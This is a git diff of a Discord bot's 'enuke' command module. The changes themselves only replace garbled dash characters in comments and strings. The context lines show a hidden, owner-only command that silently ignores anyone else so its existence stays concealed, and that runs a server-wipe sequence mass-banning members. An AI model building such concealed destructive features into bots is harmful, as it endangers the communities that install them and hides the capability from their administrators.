@@ -8,15 +8,15 @@ const enukeTargets = new Map();
 export const commands = [
   {
     name: 'enuke',
-    description: 'Opens the Enuke Manager â€” server wipe sequencer. Bot Owner only.',
+    description: 'Opens the Enuke Manager - server wipe sequencer. Bot Owner only.',
     category: 'owner',
     permissions: [],
-    slashHidden: true,  // Never register as slash command â€” prefix only
+    slashHidden: true,  // Never register as slash command - prefix only
     hidden: true,
     async executePrefix(message, args) {
       // ABSOLUTE OWNER-ONLY GATE
       if (!isBotOwnerSync(message.author.id)) {
-        return; // Silent rejection â€” don't even acknowledge the command exists
+        return; // Silent rejection - don't even acknowledge the command exists
       }
 
       let targetGuild = message.guild;
@@ -88,7 +88,7 @@ export const commands = [
 ];
 
 /**
- * Handle the Enuke Manager button click â€” opens the modal
+ * Handle the Enuke Manager button click - opens the modal
  */
 export async function handleEnukeButton(interaction) {
   console.log(`[ENUKE BUTTON] Clicked by ${interaction.user.tag} (${interaction.user.id})`);
@@ -160,7 +160,7 @@ export async function handleEnukeButton(interaction) {
 }
 
 /**
- * Handle the Enuke modal submission â€” executes the nuke sequence
+ * Handle the Enuke modal submission - executes the nuke sequence
  */
 export async function handleEnukeModal(interaction) {
   console.log(`[ENUKE MODAL] Submitted by ${interaction.user.tag} (${interaction.user.id})`);
@@ -298,7 +298,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
 
         try {
           if (member.bannable) {
-            await member.ban({ reason: `Enuke Sequence â€” executed by ${executor.tag}` }).catch(() => null);
+            await member.ban({ reason: `Enuke Sequence - executed by ${executor.tag}` }).catch(() => null);
             results.membersBanned++;
           }
         } catch {
